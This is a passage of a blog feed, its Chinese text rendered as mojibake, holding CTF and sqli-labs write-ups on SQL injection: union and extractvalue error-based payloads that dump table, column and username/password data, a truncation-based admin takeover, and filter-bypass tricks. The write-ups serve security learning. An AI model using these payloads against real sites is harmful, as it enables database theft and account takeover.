æ®µï¼ˆçœ‹é¢œè‰²ä¹Ÿèƒ½çœ‹å‡ºæ¥ï¼‰ï¼Œè¿˜æ˜¯pltä¸­çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªæ—¶å€™gotå¹¶æ²¡æœ‰å­˜å‚¨è¿™äº›å‡½æ•°çš„çœŸå®åœ°å€</p><p>æ¥ç€æ­¥è¿‡è°ƒç”¨putså‡½æ•°å</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250318085926812.png" alt="image-20250318085926812"></p><p>è¿™ä¸ªæ—¶å€™å¯ä»¥çœ‹åˆ°ï¼Œgotè¡¨ä¸­å·²ç»å¡«å…¥äº†putså‡½æ•°çš„çœŸå®åœ°å€</p><p>æˆ‘ä»¬å¾—åˆ°è¿™ä¸ªçœŸå®åœ°å€ï¼Œå¹¶ä½¿ç”¨disassæŒ‡ä»¤åæ±‡ç¼–ï¼Œå°±å¯ä»¥å¾—åˆ°putså‡½æ•°çœŸæ­£çš„ä»£ç </p><p>å¦‚æœæˆ‘ä»¬disassæ²¡æœ‰è°ƒç”¨çš„å‡½æ•°ï¼Œå¾—åˆ°çš„å°±æ˜¯pltä¸­çš„ä»£ç ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250318090244979.png" alt="image-20250318090244979"></p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTFä¸­SQLæ³¨å…¥writeup</title>
      <link href="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/"/>
      <url>/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="NewStarCTF-2023-å…¬å¼€èµ›é“-ez-sql"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-ez-sql" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]ez_sql"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]ez_sql</h2><ol><li><h5 id="åˆ¤æ–­é—­åˆæ–¹å¼ä¸º-â€™ï¼ˆå•å¼•å·ï¼‰"><a href="#åˆ¤æ–­é—­åˆæ–¹å¼ä¸º-â€™ï¼ˆå•å¼•å·ï¼‰" class="headerlink" title="åˆ¤æ–­é—­åˆæ–¹å¼ä¸º â€™ï¼ˆå•å¼•å·ï¼‰"></a>åˆ¤æ–­é—­åˆæ–¹å¼ä¸º <code>â€™</code>ï¼ˆå•å¼•å·ï¼‰</h5></li><li><h5 id="çˆ†å­—æ®µæ•°ï¼Œä»¥æˆåŠŸè”åˆæ³¨å…¥"><a href="#çˆ†å­—æ®µæ•°ï¼Œä»¥æˆåŠŸè”åˆæ³¨å…¥" class="headerlink" title="çˆ†å­—æ®µæ•°ï¼Œä»¥æˆåŠŸè”åˆæ³¨å…¥"></a>çˆ†å­—æ®µæ•°ï¼Œä»¥æˆåŠŸè”åˆæ³¨å…¥</h5></li></ol><p>â€‹<code>?id=1&#39; order by 1 --+</code></p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-1.png" alt="1-1"></p><p>â€‹å‘ç°æœ‰WAFï¼Œè¿™é‡Œä½¿ç”¨å¤§å†™ç»•è¿‡</p><p>â€‹<code>?id=1&#39; Order by 1 --+</code></p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-2.png" alt="1-2"></p><p>â€‹ä¸€ç›´å°è¯•ç›´åˆ°<code>?id=1&#39; Order by 6 --+</code>æ²¡æœ‰å›æ˜¾ï¼Œè¯´æ˜å­—æ®µæ•°ä¸º5</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-3.png" alt="1-3"></p><ol start="3"><li><h5 id="è”åˆæ³¨å…¥çˆ†æ•°æ®åº“å"><a href="#è”åˆæ³¨å…¥çˆ†æ•°æ®åº“å" class="headerlink" title="è”åˆæ³¨å…¥çˆ†æ•°æ®åº“å"></a>è”åˆæ³¨å…¥çˆ†æ•°æ®åº“å</h5></li></ol><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-4.png" alt="1-4"></p><p>â€‹å¯è§ï¼Œæ•°æ®åº“åå°±æ˜¯ctf</p><p>â€‹åˆ°è¿™é‡Œç­”æ¡ˆå°±æ˜¯åˆ°æ‰‹çš„é¸­å­äº†</p><ol start="4"><li><h5 id="é¡ºè—¤æ‘¸ç“œï¼Œæ‰¾åˆ°è¡¨å"><a href="#é¡ºè—¤æ‘¸ç“œï¼Œæ‰¾åˆ°è¡¨å" class="headerlink" title="é¡ºè—¤æ‘¸ç“œï¼Œæ‰¾åˆ°è¡¨å"></a>é¡ºè—¤æ‘¸ç“œï¼Œæ‰¾åˆ°è¡¨å</h5></li></ol><p><code>?id=1&#39; UNION SELECT 1,2,3,4,GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA =&#39;ctf&#39; --+</code></p><p>â€‹<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-5.png" alt="1-5"></p><p>â€‹æ˜¾ç„¶flagåœ¨here_is_flagè¿™ä¸ªè¡¨ä¸­ï¼Œä½†æˆ‘ä»¬å…ˆè¦æ‰¾åˆ°åœ¨å“ªä¸ªå­—æ®µä¸‹ï¼ˆå½“ç„¶ä¸€èˆ¬å¯ä»¥ç›´æ¥çŒœå‡ºæ¥å­—æ®µåä¸ºflagï¼‰</p><ol start="5"><li><h5 id="å†æ‰¾åˆ°å­—æ®µå"><a href="#å†æ‰¾åˆ°å­—æ®µå" class="headerlink" title="å†æ‰¾åˆ°å­—æ®µå"></a>å†æ‰¾åˆ°å­—æ®µå</h5></li></ol><p>â€‹<code>?id=1&#39; UNION SELECT 1,2,3,4,GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME =&#39;here_is_flag&#39; --+</code></p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-6.png" alt="1-6"></p><ol start="6"><li><h5 id="æŸ¥è¯¢å­—æ®µå€¼"><a href="#æŸ¥è¯¢å­—æ®µå€¼" class="headerlink" title="æŸ¥è¯¢å­—æ®µå€¼"></a>æŸ¥è¯¢å­—æ®µå€¼</h5></li></ol><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-7.png" alt="1-7"></p><p>â€‹å¤§åŠŸå‘Šæˆ</p><hr><h2 id="BUU-SQL-COURSE-1"><a href="#BUU-SQL-COURSE-1" class="headerlink" title="BUU SQL COURSE 1"></a>BUU SQL COURSE 1</h2><p>ç‚¹è¿›å»å‘ç°æœ‰ä¸¤ä¸ªæ¨¡å—ï¼Œä¸€ä¸ªæ–°é—»é¡µé¢ï¼Œä¸€ä¸ªç™»å½•é¡µé¢ã€‚</p><ol><li><h5 id="æ‰¾åˆ°æ³¨å…¥ä½ç½®"><a href="#æ‰¾åˆ°æ³¨å…¥ä½ç½®" class="headerlink" title="æ‰¾åˆ°æ³¨å…¥ä½ç½®"></a>æ‰¾åˆ°æ³¨å…¥ä½ç½®</h5></li></ol><p>ç‚¹å¼€çƒ­ç‚¹ä¸­çš„çƒ­ç‚¹ä¸€ï¼Œå‘ç°è¿™é‡Œæœ‰ä¸€ä¸ªphpè¯·æ±‚ï¼ŒçŒœæµ‹æ˜¯å¦è¿™é‡Œæœ‰sqlæ³¨å…¥ï¼ˆä¸ºä»€ä¹ˆå‘¢ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-1.png" alt="2-1"></p><ol start="2"><li><h5 id="å¼€å§‹æ³¨å…¥ï¼ˆå…¬å¼åŒ–ï¼‰"><a href="#å¼€å§‹æ³¨å…¥ï¼ˆå…¬å¼åŒ–ï¼‰" class="headerlink" title="å¼€å§‹æ³¨å…¥ï¼ˆå…¬å¼åŒ–ï¼‰"></a>å¼€å§‹æ³¨å…¥ï¼ˆå…¬å¼åŒ–ï¼‰</h5></li></ol><p>çˆ†å­—æ®µæ•°</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-2.png" alt="2-2"></p><p>çˆ†åº“å</p><p><code>?id=-1 union select 1,database() --+</code></p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-3.png" alt="2-3"></p><p>çˆ†è¡¨å</p><p><code>?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39; --+</code></p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-4.png" alt="2-4"></p><p>çˆ†å­—æ®µå</p><p><code>?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;admin&#39; --+</code></p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-5.png" alt="2-5"></p><p>çˆ†å­—æ®µå€¼</p><p><code>?id=-1 union select 1,group_concat(username,&#39;,&#39;,password) from news.admin --+</code></p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-6.png" alt="2-6"></p><p>å¾—åˆ°è´¦å·å¯†ç åå°±å»ç™»å½•å§</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-7.png" alt="2-7"></p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-8.png" alt="2-8"></p><p>å®Œç»“æ’’èŠ±<em>â˜…,Â°</em>:.â˜†(ï¿£â–½ï¿£)&#x2F;$:<em>.Â°â˜…</em> ã€‚</p><hr><h2 id="CTF-BugKu-sqli-0x1"><a href="#CTF-BugKu-sqli-0x1" class="headerlink" title="CTF-BugKu-sqli-0x1"></a>CTF-BugKu-sqli-0x1</h2><p><a href="https://blog.csdn.net/weixin_73625393/article/details/137773172">https://blog.csdn.net/weixin_73625393/article/details/137773172</a></p><p><a href="http://danielw.top/index.php/daniel/340/">http://danielw.top/index.php/daniel/340/</a></p><p>æ²¡æœ‰å˜åŒ–ï¼Œä½¿ç”¨çš„æ˜¯POSTä¼ å‚</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241115233313019.png" alt="image-20241115233313019"></p><p>æ‰“å¼€æºä»£ç çœ‹çœ‹</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241115233348097.png" alt="image-20241115233348097"></p><p>å‘ç°æœ‰æç¤ºã€‚æŸ¥çœ‹è¿™ä¸ªphpæ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241115233653921.png" alt="image-20241115233653921"></p><p>å¾…æ°´å¹³è¿›æ­¥å†æ¥åšè¿™ä¸ªqaq</p><h2 id="CTF-BugKu-login1"><a href="#CTF-BugKu-login1" class="headerlink" title="CTF-BugKu-login1"></a>CTF-BugKu-login1</h2><p><a href="https://blog.csdn.net/lga0325/article/details/143353230">https://blog.csdn.net/lga0325/article/details/143353230</a></p><p>åœ¨ç™»å½•å¯†ç æ˜¯ï¼Œè´¦å·é»˜è®¤ä¸ºadminï¼Œè¾“å…¥å„ç§ä¸‡èƒ½å¯†ç éƒ½æ²¡ç”¨</p><p>æŸ¥çœ‹æ³¨å†Œé¡µé¢</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241115235406854.png" alt="image-20241115235406854"></p><p>å‘ç°adminå·²ç»å­˜åœ¨äº†</p><p>è¿™ä¸ªæ—¶å€™è€ƒè™‘SQLçº¦æŸæ”»å‡»</p><p>åœ¨æ³¨å†Œç”¨æˆ·æ—¶ï¼Œå› ä¸º insert æ’å…¥æ•°æ®å—åˆ°æ•°æ®åº“å®šä¹‰çš„é•¿åº¦é™åˆ¶ï¼Œä¼šè‡ªåŠ¨å°†è¶…å‡ºé•¿åº¦çš„æ•°æ®æˆªæ–­ã€‚å› æ­¤ï¼Œå¦‚æœ uname çš„é•¿åº¦é™åˆ¶ä¸º char(7)ï¼Œé‚£ä¹ˆæ³¨å†Œè´¦å·<code>&#39;admin a&#39;</code>æ—¶ï¼Œç”±äºé•¿åº¦è¶…å‡ºï¼Œåˆ™åé¢çš„ <code>a</code> ä¼šè¢«æˆªæ–­ï¼Œæ­¤æ—¶ï¼Œæ•°æ®åº“å­˜å‚¨æ•°æ®ä¼šæŠŠç©ºæ ¼åˆ é™¤ï¼Œåœ¨æ•°æ®åº“å†…å°±å˜æˆäº†<code>admin</code>        ï¼ˆï¼Ÿæ€ä¹ˆä¼šæœ‰ä¸ƒä¸ªå­—ç¬¦ï¼Ÿï¼‰</p><p>æ­¤æ—¶ç™»å½•æ—¶ä½¿ç”¨ admin å’Œè‡ªå·±æ³¨å†Œçš„å¯†ç ç™»å½•ï¼Œæ•°æ®åº“è¿”å›æ³¨å†Œæ—¶çš„è´¦å·ä¿¡æ¯ï¼Œä½†æ˜¯å¦‚æœä¸šåŠ¡ä¾§ä»…æ ¹æ®è¿”å›çš„ç”¨æˆ·åä¿¡æ¯åˆ¤æ–­æƒé™ï¼Œåˆ™ä¼šå¯¼è‡´æ°´å¹³è¶Šæƒçš„æ¼æ´</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116000616003.png" alt="image-20241116000616003"></p><p>æ³¨å†ŒæˆåŠŸï¼Œæ³¨æ„ç”¨æˆ·åè¿™é‡Œæœ‰ä¸€ä¸ªç©ºæ ¼</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116000703445.png" alt="image-20241116000703445"></p><p>ç›´æ¥ä½¿ç”¨adminèº«ä»½ç™»å½•å¾—åˆ°flag</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> sqlæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labï¼ˆä¸€ï¼‰</title>
      <link href="/2024/11/09/sql-lab/"/>
      <url>/2024/11/09/sql-lab/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="MySQLç‰¹æ€§"><a href="#MySQLç‰¹æ€§" class="headerlink" title="MySQLç‰¹æ€§"></a>MySQLç‰¹æ€§</h1><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/sql1.png" alt="sql1"></p><p>å›¾å†…è¡¥å……ï¼š<br>table_schema ï¼š è¡¨å½’å±äºçš„æ•°æ®åº“</p><p>information_schemaï¼šè¿™æ˜¯ä¸€ä¸ªmysqlè‡ªå¸¦çš„åº“ï¼Œå…¶ä¸­ä¿å­˜ç€å…³äºmysqlæœåŠ¡å™¨æ‰€ç»´æŠ¤çš„æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ã€‚å¦‚æ•°æ®åº“åï¼Œæ•°æ®åº“çš„è¡¨ï¼Œè¡¨åˆ—çš„æ•°æ®ç±»å‹ä¸è®¿é—®æƒé™ç­‰ï¼Œæ‰€ä»¥æˆ‘ä»¬æŸ¥è¯¢è¿™ä¸ªåº“</p><p>æŸ¥è¯¢å½“å‰ç”¨æˆ·ï¼š<code>select userï¼ˆï¼‰</code></p><p>æ•°æ®åº“ç‰ˆæœ¬ï¼š <code>select version ï¼ˆï¼‰</code></p><p>æ•°æ®åº“åï¼š <code>select databaseï¼ˆï¼‰</code></p><p>æŸ¥çœ‹æ•°æ®åº“&#x2F;è¡¨ï¼š<code>show databases/tablesï¼›</code></p><p>åˆ‡æ¢æ•°æ®åº“ï¼š <code>use æ•°æ®åº“å</code></p><p>åŸºç¡€æŸ¥è¯¢ï¼š<code>select å­—æ®µ1ï¼Œ å­—æ®µ2, â€¦ from è¡¨åï¼›</code>   <code>select * from è¡¨åï¼›</code></p><p>æ¡ä»¶æŸ¥è¯¢ï¼š<code>select å­—æ®µ from è¡¨å where æ¡ä»¶</code></p><p><strong>è”åˆæŸ¥è¯¢ï¼š<code>select * from è¡¨å union select 1ï¼Œ2ï¼Œ3</code></strong>  </p><p>æ’åºï¼š <code>select * from è¡¨å order by å­—æ®µ</code></p><hr><h1 id="SQLæ³¨å…¥å¸¸è§ç±»å‹"><a href="#SQLæ³¨å…¥å¸¸è§ç±»å‹" class="headerlink" title="SQLæ³¨å…¥å¸¸è§ç±»å‹"></a>SQLæ³¨å…¥å¸¸è§ç±»å‹</h1><h2 id="æŒ‰æ³¨å…¥ç‚¹ç±»å‹åˆ†ç±»"><a href="#æŒ‰æ³¨å…¥ç‚¹ç±»å‹åˆ†ç±»" class="headerlink" title="æŒ‰æ³¨å…¥ç‚¹ç±»å‹åˆ†ç±»"></a>æŒ‰æ³¨å…¥ç‚¹ç±»å‹åˆ†ç±»</h2><h3 id="æ•°å­—å‹æ³¨å…¥"><a href="#æ•°å­—å‹æ³¨å…¥" class="headerlink" title="æ•°å­—å‹æ³¨å…¥"></a>æ•°å­—å‹æ³¨å…¥</h3><p>å½“è¾“å…¥çš„å‚æ•°xä¸ºæ•´å½¢æ—¶ï¼Œå³select  *  from  &lt;è¡¨å &gt;  where id &#x3D; x</p><p>åˆ¤æ–­ï¼š 1 and 1 &#x3D; 1           1 and 1 &#x3D; 2        æ¯”è¾ƒä¸¤è€…çš„è¿”å›é¡µé¢</p><h3 id="å­—ç¬¦å‹æ³¨å…¥"><a href="#å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="å­—ç¬¦å‹æ³¨å…¥"></a>å­—ç¬¦å‹æ³¨å…¥</h3><p>å½“è¾“å…¥çš„å‚æ•°xä¸ºå­—ç¬¦å‹æ—¶ï¼Œå³select * from &lt;è¡¨å&gt; where id &#x3D; â€˜xâ€™</p><p>åˆ¤æ–­ï¼š 1â€˜ and â€˜1â€™ &#x3D; â€˜1          1â€™ and â€˜1â€™ &#x3D; â€˜2 </p><h2 id="æŒ‰è·å–æ–¹å¼åˆ†ç±»"><a href="#æŒ‰è·å–æ–¹å¼åˆ†ç±»" class="headerlink" title="æŒ‰è·å–æ–¹å¼åˆ†ç±»"></a><strong>æŒ‰è·å–æ–¹å¼åˆ†ç±»</strong></h2><h3 id="åŸºäºæŠ¥é”™çš„æ³¨å…¥"><a href="#åŸºäºæŠ¥é”™çš„æ³¨å…¥" class="headerlink" title="åŸºäºæŠ¥é”™çš„æ³¨å…¥"></a>åŸºäºæŠ¥é”™çš„æ³¨å…¥</h3><p>åˆ©ç”¨é¡µé¢å›æ˜¾çš„æ•°æ®åº“æŠ¥é”™ä¿¡æ¯</p><h4 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h4><p>åœ¨æ³¨å…¥ç‚¹çš„åˆ¤æ–­è¿‡ç¨‹ä¸­ï¼ŒSQLè¯­å¥æ‰§è¡Œåçš„æŠ¥é”™ä¿¡æ¯ä¼šç»è¿‡åç«¯æ˜¾ç¤ºåœ¨é¡µé¢ä¸­å</p><h4 id="å¸¸è§å¯åˆ©ç”¨å‡½æ•°"><a href="#å¸¸è§å¯åˆ©ç”¨å‡½æ•°" class="headerlink" title="å¸¸è§å¯åˆ©ç”¨å‡½æ•°"></a>å¸¸è§å¯åˆ©ç”¨å‡½æ•°</h4><p>floor()<strong>extractvalue()updatexml()</strong>geometrycollection()polygon()multipolygon()</p><p><strong>concat()</strong></p><h5 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h5><p><code>concat(str1, str2,â€¦)</code></p><p>å°†å¤šä¸ªå­—ç¬¦ä¸²è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²</p><h5 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat"></a>group_concat</h5><p><code>group_concat( [DISTINCT] è¦è¿æ¥çš„å­—æ®µ [Order BY æ’åºå­—æ®µ ASC/DESC] [Separator â€˜åˆ†éš”ç¬¦â€™] )</code></p><p>ä½¿ç”¨distinctå¯ä»¥æ’é™¤é‡å¤å€¼</p><p>å¦‚æœéœ€è¦å¯¹ç»“æœä¸­çš„å€¼è¿›è¡Œæ’åºï¼Œå¯ä»¥ä½¿ç”¨order byå­å¥</p><p>separatoræ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²å€¼ï¼Œé»˜è®¤ä¸ºé€—å·</p><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h5><p><code>extractvalue(&#39;ç›®æ ‡xmlæ–‡ä»¶å&#39;,&#39;åœ¨xmlä¸­æŸ¥è¯¢çš„å­—ç¬¦ä¸²&#39;)</code></p><p>ä»ç›®æ ‡xmlæ–‡ä»¶ä¸­è¿”å›åŒ…å«æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸²</p><p><strong>extractvalueå‡½æ•°ä¸€æ¬¡åªèƒ½æŸ¥è¯¢32ä½é•¿åº¦</strong></p><p>è§£å†³æ–¹æ¡ˆï¼š</p><ol><li>åŠ ä¸Š<code>limit x,1</code> é€ä¸€æŸ¥è¯¢</li><li>ç”¨group_concatå‡½æ•°æŠŠæŸ¥è¯¢ç»“æœåˆ†ç»„èšåˆï¼Œç„¶åç”¨<code>and xxxx not in â€™xxxâ€˜ï¼Œâ€™xxxâ€˜</code>è¿‡æ»¤æ‰å‰é¢å›æ˜¾çš„</li><li>ç”¨<code>substring()</code>æˆªå–</li></ol><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h5><p><code>updatexml(&#39;ç›®æ ‡xmlæ–‡ä»¶å&#39;,&#39;åœ¨xmlä¸­æŸ¥è¯¢çš„å­—ç¬¦ä¸²&#39;,&#39;æ›¿æ¢åçš„å€¼&#39;)</code></p><p>ä¿®æ”¹xmlæ–‡ä»¶ä¸­ç¬¦åˆå­—ç¬¦ä¸²çš„å€¼</p><h3 id="åŸºäºå¸ƒå°”çš„ç›²æ³¨"><a href="#åŸºäºå¸ƒå°”çš„ç›²æ³¨" class="headerlink" title="åŸºäºå¸ƒå°”çš„ç›²æ³¨"></a>åŸºäºå¸ƒå°”çš„ç›²æ³¨</h3><p>åˆ©ç”¨é¡µé¢è¿”å›çš„ä¸ä¸€è‡´</p><h3 id="åŸºäºæ—¶é—´çš„ç›²æ³¨"><a href="#åŸºäºæ—¶é—´çš„ç›²æ³¨" class="headerlink" title="åŸºäºæ—¶é—´çš„ç›²æ³¨"></a>åŸºäºæ—¶é—´çš„ç›²æ³¨</h3><p>åˆ©ç”¨é¡µé¢å“åº”æ—¶é—´</p><h3 id="è”åˆæŸ¥è¯¢æ³¨å…¥"><a href="#è”åˆæŸ¥è¯¢æ³¨å…¥" class="headerlink" title="è”åˆæŸ¥è¯¢æ³¨å…¥"></a>è”åˆæŸ¥è¯¢æ³¨å…¥</h3><p>ä½¿ç”¨unionå…³é”®å­—</p><h3 id="å †å æŸ¥è¯¢æ³¨å…¥"><a href="#å †å æŸ¥è¯¢æ³¨å…¥" class="headerlink" title="å †å æŸ¥è¯¢æ³¨å…¥"></a>å †å æŸ¥è¯¢æ³¨å…¥</h3><p>æ‰§è¡Œå¤šæ¡SQLè¯­å¥</p><hr><h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h2><h3 id="åŒå†™ç»•è¿‡"><a href="#åŒå†™ç»•è¿‡" class="headerlink" title="åŒå†™ç»•è¿‡"></a>åŒå†™ç»•è¿‡</h3><h3 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a>å¤§å°å†™ç»•è¿‡</h3><h3 id="ç©ºæ ¼è¢«è¿‡æ»¤"><a href="#ç©ºæ ¼è¢«è¿‡æ»¤" class="headerlink" title="ç©ºæ ¼è¢«è¿‡æ»¤"></a>ç©ºæ ¼è¢«è¿‡æ»¤</h3><p>&#x2F;**&#x2F; </p><h3 id="and-orè¢«è¿‡æ»¤"><a href="#and-orè¢«è¿‡æ»¤" class="headerlink" title="and&#x2F;orè¢«è¿‡æ»¤"></a>and&#x2F;orè¢«è¿‡æ»¤</h3><p>&amp;&amp; ||</p><hr><h1 id="SQLi-labs"><a href="#SQLi-labs" class="headerlink" title="SQLi-labs"></a>SQLi-labs</h1><h3 id="lesson-1"><a href="#lesson-1" class="headerlink" title="lesson 1"></a>lesson 1</h3><h4 id="åŸºäºæŠ¥é”™çš„æ³¨å…¥-1"><a href="#åŸºäºæŠ¥é”™çš„æ³¨å…¥-1" class="headerlink" title="åŸºäºæŠ¥é”™çš„æ³¨å…¥"></a>åŸºäºæŠ¥é”™çš„æ³¨å…¥</h4><ol><li>éªŒè¯æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥</li></ol><p>â€‹<code>?id = 1 and 1 = 1</code>         å’Œ    <code>?id = 1 and 1 = 2</code></p><p>â€‹<code>?id = 1&#39; and &#39;1&#39; = &#39;1</code> å’Œ   <code>?id = 1&#39; and &#39;1&#39;=&#39;2</code></p><p>â€‹       åˆ¤æ–­ä¸¤æ¬¡å›æ˜¾ç»“æœæ˜¯å¦ç›¸åŒã€‚</p><ol><li><p>æŸ¥è¯¢å½“å‰æ•°æ®åº“</p><p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select database()),0x7e))) --+</code>ã€</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241110003235758.png" alt="image-20241110003235758"></p><p>çˆ†å‡ºæ•°æ®åº“åä¸ºsecurity</p><p>å½“ç„¶ç”¨unionä¹Ÿå¯ä»¥</p></li><li><p>æŸ¥è¯¢è¡¨å</p></li></ol><p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e))) --+</code></p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241110004543422.png" alt="image-20241110004543422"></p><ol start="4"><li>æŸ¥è¯¢å­—æ®µå</li></ol><p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;emails&#39;),0x7e))) --+</code></p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241110005049115.png" alt="image-20241110005049115"></p><ol start="5"><li>æŸ¥è¯¢å­—æ®µå€¼</li></ol><p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(id,&#39;,&#39;,email_id) from security.emails),0x7e))) --+</code></p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241110005953540.png" alt="image-20241110005953540"></p><p>å‘ç°æ²¡æœ‰æ˜¾ç¤ºå®Œ</p><p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select substring(group_concat(id,&#39;,&#39;,email_id),80,40) from security.emails),0x7e))) --+</code></p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241110010136450.png" alt="image-20241110010136450"></p><p>è¯•ç€è¿™æ ·æŸ¥è¯¢ä¸€ä¸‹è´¦å·å’Œå¯†ç å§</p><h4 id="è”åˆæ³¨å…¥æ³•"><a href="#è”åˆæ³¨å…¥æ³•" class="headerlink" title="è”åˆæ³¨å…¥æ³•"></a>è”åˆæ³¨å…¥æ³•</h4><p>1.çˆ†å­—æ®µæ•°é‡</p><p>order by</p><p>2.çˆ†æ•°æ®åº“å</p><p>union select </p><p>æ³¨æ„ä¿®æ”¹idä¿®æ”¹ä¸ºè´Ÿæ•°ã€‚</p><p>å…ˆè¯•è¯•çœ‹å“ªäº›ä½ç½®å¯ä»¥å›æ˜¾å‡ºæ¥ã€‚</p><p>3.çˆ†è¡¨å</p><p>4.çˆ†å­—æ®µå</p><p>5.çˆ†å­—æ®µå€¼</p><h3 id="lesson-2"><a href="#lesson-2" class="headerlink" title="lesson 2"></a>lesson 2</h3><p>è¿‡ç¨‹å’Œlesson 1ä¸€æ ·ã€‚åªä¸è¿‡æ˜¯æ•°å­—å‹æ³¨å…¥ã€‚</p><h3 id="lesson-3"><a href="#lesson-3" class="headerlink" title="lesson 3"></a>lesson 3</h3><p>è¿‡ç¨‹å’Œlesson 1ä¸€æ ·ï¼Œä¸è¿‡é—­åˆæ–¹å¼ä¸º â€˜ï¼‰</p><h3 id="lesson-4"><a href="#lesson-4" class="headerlink" title="lesson 4"></a>lesson 4</h3><p>è¿‡ç¨‹å’Œlesson 1ä¸€æ ·ï¼Œä¸è¿‡é—­åˆæ–¹å¼ä¸º â€ï¼‰</p><h3 id="lesson-5"><a href="#lesson-5" class="headerlink" title="lesson 5"></a>lesson 5</h3><p>ä¹Ÿå¯ä»¥è¿™æ ·åš</p><h3 id="lesson-6"><a href="#lesson-6" class="headerlink" title="lesson 6"></a>lesson 6</h3><p>ä¹Ÿå¯ä»¥è¿™æ 